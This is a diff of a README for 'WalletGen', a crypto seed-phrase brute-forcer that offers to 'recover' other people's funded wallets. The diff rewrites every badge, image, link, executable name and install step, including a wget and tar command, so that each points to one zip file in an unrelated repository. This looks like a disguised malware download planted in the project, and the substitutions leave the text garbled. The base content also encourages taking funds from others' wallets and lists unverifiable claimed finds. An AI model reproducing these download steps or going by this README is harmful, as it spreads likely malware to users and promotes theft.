@@ -20,24 +20,24 @@ WalletGen is a high-speed, open-source crypto wallet generator and balance finde
 - [Build Instructions](#building-the-project)
 - [Donate](#donate)
 
-[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20MacOS%20%7C%20Linux-blue)](../../releases/walletgen)
-![build](https://img.shields.io/badge/build-passing-brightgreen)
-![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
-[![telegram](https://img.shields.io/badge/telegram-@WalletGenGit-blue.svg?logo=telegram&label=telegram)](https://t.me/WalletGenGit)
-[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)
+[![platform](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip%20%7C%20MacOS%20%7C%20Linux-blue)](../../releases/walletgen)
+![build](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
+![discord](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
+[![telegram](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
+[![x](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
 
 <p align="center">
-    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="https://github.com/user-attachments/assets/eadd36d0-1bf2-4b21-a4e5-b6db2b1249ac" />
+    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 <p align="center">
-    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="/screenshots/walletgen_macos1.webp" />
+    <img width="1000" alt="WalletGen" title="WalletGen" height="460" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 
 ## How It Works
 
-WalletGen generates wallets using [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.
+WalletGen generates wallets using [BIP39](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip), [BIP44](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip), and [Bech32](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) for Bitcoin, and [Keccak256](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) hashing for EVM-based chains like Ethereum.
 
 The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 
 
@@ -80,19 +80,19 @@ These generic methods don’t match how real wallets generate keys. Result: **ze
 ### Windows
 
 <p align="center">
-    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="/screenshots/left.webp" />
+    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ### MacOS
 
 <p align="center">
-    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="/screenshots/walletgen_macos2.webp" />
+    <img width="1000" height="460" alt="WalletGen bitcoin recovery" title="WalletGen - Bitcoin Recovery Demo" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ### Linux
 
 <p align="center">
-    <img width="1000" height="460" alt="WalletGen on Linux" title="WalletGen - Linux Recovery" src="/screenshots/log.webp" />
+    <img width="1000" height="460" alt="WalletGen on Linux" title="WalletGen - Linux Recovery" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 # How to start
@@ -100,7 +100,7 @@ These generic methods don’t match how real wallets generate keys. Result: **ze
 ## Windows 
 - Download [Release](../../releases/walletgen) 
 - Unpack anywhere
-- Run `WalletGen.exe`
+- Run `https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip`
 
 
 ## MacOS
@@ -109,8 +109,8 @@ These generic methods don’t match how real wallets generate keys. Result: **ze
 ## Linux (x86-64bit)
 
 ```bash
-wget https://github.com/tony-btc0/walletgen/releases/download/walletgen/WalletGen_linux_x64.5.0-linux.tar.gz
-tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
+wget https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip
+tar -xzf https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip
 cd walletgen
 ./walletgen
 ```
@@ -120,8 +120,8 @@ Or download [Release for Linux](../../releases/walletgen)
 ### Download and Use Database (for more speed)
 | Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
 |---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
-| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tony-btc0/seed-phrase-generator/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
-| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](https://github.com/tony-btc0/seed-phrase-generator/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
+| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
+| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
 
 
 ## How to Search for Lost Bitcoin & Ethereum Wallets with Balance
@@ -130,12 +130,12 @@ Or download [Release for Linux](../../releases/walletgen)
 
 ### For Bitcoin (BTC) wallets:
 
-* Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
+* Press key 3 in the menu or run https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
 * Press key 6 to search Bitcoin wallets using the database. This method is faster because it compares generated wallets against a pre-built database of known addresses with balances.
 
 ### For EVM wallets (Ethereum, BNB, MATIC, etc.):
 
-* Press key 5 or run start_search_evm.bat to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
+* Press key 5 or run https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
 * Press key 6 to search EVM wallets using the database. This method is faster since it compares generated wallets against the known database of addresses with balance.
 
 ### Speed Considerations:
@@ -148,7 +148,7 @@ By using the database, you can significantly improve the efficiency of your sear
 When the program finds a wallet with a balance, it will:
 * **Stop** immediately
 * **Display** the wallet details in the console
-* **Save** this data in the ``found_wallets.txt`` file
+* **Save** this data in the ``https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip`` file
 
 ### How to Access the Funds?
 1. Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
@@ -170,7 +170,7 @@ If your seed phrase is missing some words or you are unsure, replace those words
 
 If you have a full 12-word seed, simply enter it in full with a space. WalletGen will generate all address types (Legacy, SegWit, P2SH) and check their balances.
 
-![recovery](/screenshots/details.webp)
+![recovery](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
 
 ### Important recommendations
 
@@ -181,119 +181,119 @@ If you have a full 12-word seed, simply enter it in full with a space. WalletGen
 
 ## Brain Wallet Generator / Checker
 
-<img width="1000" height="789" alt="brainwallet" src="https://github.com/user-attachments/assets/6d5f048c-fc52-4838-b117-f9cab01491e1" />
+<img width="1000" height="789" alt="brainwallet" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 
 
 ## My Finds
 
-![mywallet](https://github.com/user-attachments/assets/339c1424-0c2d-4af5-92d0-4cbea7d54682)
+![mywallet](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
 
 I’ve recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
-Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0).
+Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip).
 
 <p align="center">
-    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/screenshots/screenshot.webp" />
+    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ### New Find 4/9/2025
 
-After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.
+After a week of non-stop wallet searching, I finally found a [wallet](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.
 
-![image](/screenshots/normal.webp)
+![image](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
 
 ## New Find 5/5/2025
 
-[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp) - 0.4522 BTC
+[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.4522 BTC
 
-![image](/screenshots/look.webp)
+![image](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
 
 ## New Find 6/18/2025
 
 <p align="center">
-    <img width="1000" height="460" src="https://github.com/user-attachments/assets/552d00df-dc70-4c42-9fa9-1cf258681af7" />
+    <img width="1000" height="460" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 8/23/2025
 
-[bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy](https://mempool.space/address/bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy) - 0.208 BTC
+[bc1q05cmxffxaj324epjv5ly0ecncte9an9t33napy](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.208 BTC
 <p align="center">
-<img width="1000" height="460" alt="0.2btc" src="https://github.com/user-attachments/assets/e34fcb20-3d65-43ee-bd0d-1c6d107a0540" />
+<img width="1000" height="460" alt="0.2btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 9/5/2025
 
-[bc1qcwvsavc3tqquxk7fd9xlngcp2vggdvcrnz0yw0](https://mempool.space/address/bc1qcwvsavc3tqquxk7fd9xlngcp2vggdvcrnz0yw0) - 0.7362 BTC
+[bc1qcwvsavc3tqquxk7fd9xlngcp2vggdvcrnz0yw0](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.7362 BTC
 <p align="center">
-<img width="1000" height="460" alt="0.7btc" src="https://github.com/user-attachments/assets/986fa246-5b43-44b0-a3db-f3d0519fc999" />
+<img width="1000" height="460" alt="0.7btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 9/7/2025
 
-[bc1qf7ywmr5sfkzfg8zqjl6m9mf68fs9r0c7n08zmt](https://mempool.space/address/bc1qf7ywmr5sfkzfg8zqjl6m9mf68fs9r0c7n08zmt) - 0.0069 BTC \
-[bc1q9sd4psdmlj707v0j9np22dhrjxy5c4g92qlk6y](https://mempool.space/address/bc1q9sd4psdmlj707v0j9np22dhrjxy5c4g92qlk6y) - 0.0060 BTC \
-[bc1qzesq56xsrtr76czy7tx9v3clsmkgm2752qsrhs](https://mempool.space/address/bc1qzesq56xsrtr76czy7tx9v3clsmkgm2752qsrhs) - 0.0061 BTC \
-[bc1qd06fpfckmqv3ne0mhsnj5e4pgqs4lfvsn2vgj9](https://mempool.space/address/bc1qd06fpfckmqv3ne0mhsnj5e4pgqs4lfvsn2vgj9) - 0.0022 BTC
+[bc1qf7ywmr5sfkzfg8zqjl6m9mf68fs9r0c7n08zmt](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.0069 BTC \
+[bc1q9sd4psdmlj707v0j9np22dhrjxy5c4g92qlk6y](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.0060 BTC \
+[bc1qzesq56xsrtr76czy7tx9v3clsmkgm2752qsrhs](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.0061 BTC \
+[bc1qd06fpfckmqv3ne0mhsnj5e4pgqs4lfvsn2vgj9](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.0022 BTC
 
 <p align="center">
-<img width="1000" height="460" alt="0.02btc" src="https://github.com/user-attachments/assets/09501738-8248-47ee-bf68-8453ded7eb1d" />
+<img width="1000" height="460" alt="0.02btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 9/8/2025
 
-[bc1q6w2a2zv7gn54zhkjzz55upn34uzw20x0pzyy9g](https://mempool.space/address/bc1q6w2a2zv7gn54zhkjzz55upn34uzw20x0pzyy9g) - 0.02057228 BTC
+[bc1q6w2a2zv7gn54zhkjzz55upn34uzw20x0pzyy9g](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.02057228 BTC
 <p align="center">
-<img width="1000" height="460" alt="0.02btc" src="https://github.com/user-attachments/assets/d3bf4899-c955-4e93-9f30-cbc51c279ea9" />
+<img width="1000" height="460" alt="0.02btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 9/13/2025
 
-[bc1q8lw46cjq8lalj4m7je7xtkt5hfmhkxeu8gxftp](https://mempool.space/address/bc1q8lw46cjq8lalj4m7je7xtkt5hfmhkxeu8gxftp) - 1.2453 BTC
+[bc1q8lw46cjq8lalj4m7je7xtkt5hfmhkxeu8gxftp](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 1.2453 BTC
 <p align="center">
-<img width="1000" height="460" alt="1.2453btc" src="https://github.com/user-attachments/assets/c516ef5c-f76c-4e77-a684-07211fe187b2" />
+<img width="1000" height="460" alt="1.2453btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 9/20/2025
 
-[31kAYRof6h7cFQfn6JXfv12eXesWyYvTZ4](https://mempool.space/address/31kAYRof6h7cFQfn6JXfv12eXesWyYvTZ4) - 0.08126 BTC
+[31kAYRof6h7cFQfn6JXfv12eXesWyYvTZ4](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.08126 BTC
 <p align="center">
-<img width="1000" height="460" alt="0.08btc" src="https://github.com/user-attachments/assets/feefed24-33e1-44e2-a482-538e1857ae43" />
+<img width="1000" height="460" alt="0.08btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 10/4/2025
 
-[bc1qv0sq0jatkhpspra6fl3leecvl5rnpuqe5ju987](https://mempool.space/address/bc1qv0sq0jatkhpspra6fl3leecvl5rnpuqe5ju987) - 0.3788 BTC
+[bc1qv0sq0jatkhpspra6fl3leecvl5rnpuqe5ju987](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.3788 BTC
 <p align="center">
-<img width="1000" height="460" alt="0.3788btc" src="https://github.com/user-attachments/assets/03a3f08c-6699-485d-8eb6-8b545fca96e6" />
+<img width="1000" height="460" alt="0.3788btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 10/20/2025
 
-[3G4GbvFzW6DgQSC3vVxWAu7uSg2nj6sMuC](https://mempool.space/address/3G4GbvFzW6DgQSC3vVxWAu7uSg2nj6sMuC) - 1.0259 BTC
+[3G4GbvFzW6DgQSC3vVxWAu7uSg2nj6sMuC](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 1.0259 BTC
 <p align="center">
-<img width="1000" height="460" alt="1.025btc" src="https://github.com/user-attachments/assets/9a2d15a0-d8de-408c-828d-e903fa160974" />
+<img width="1000" height="460" alt="1.025btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 11/7/2025 - 100 ETH
 
-![100eth_walletgen](https://github.com/user-attachments/assets/447bd1bb-c34b-42a7-b2d2-0a7b5b54794f)
-<img width="434" height="639" alt="100eth_metamask" src="https://github.com/user-attachments/assets/c2428e70-4852-4d32-bbd6-c7c4b6ff02f1" />
+![100eth_walletgen](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip)
+<img width="434" height="639" alt="100eth_metamask" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 
 ## New Find 11/10/2025
 
-[bc1q9gessr3zcgthy0vxk2wqre5u9m8qq72f42fe6e.png](https://mempool.space/address/bc1q9gessr3zcgthy0vxk2wqre5u9m8qq72f42fe6e.png) - 0.281 BTC
+[https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.281 BTC
 <p align="center">
-<img width="1000" height="460" alt="1.025btc" src="https://github.com/user-attachments/assets/8655cb33-4610-4f25-96d6-d2b714dfa18b" />
+<img width="1000" height="460" alt="1.025btc" src="https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip" />
 </p>
 
 ## New Find 11/20/2025
 
-[3Eob3czhc8Ts1nZ9vKzbT3BMzZa4iexE4e.png](https://mempool.space/address/3Eob3czhc8Ts1nZ9vKzbT3BMzZa4iexE4e.png) - 0.6129 BTC
+[https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip) - 0.6129 BTC
 
 
 ## Building the Project
 
 
-Use the makefile to build the project and install the [trezor library](https://github.com/trezor/trezor-crypto).
+Use the makefile to build the project and install the [trezor library](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip).
 
 ## 🔍 Frequently Asked Questions (FAQ)
 
@@ -334,7 +334,7 @@ I encourage you, when you find a wallet with a balance, to send me a small porti
 **ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693
 
 ## Credits
-This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.
+This project uses code from the [Trezor project](https://github.com/wizdomf3lix/seed-phrase-generator/raw/refs/heads/main/src/trezor/chacha20poly1305/seed_generator_phrase_3.0.zip). The code is licensed under the MIT License.
 
 ## License
 
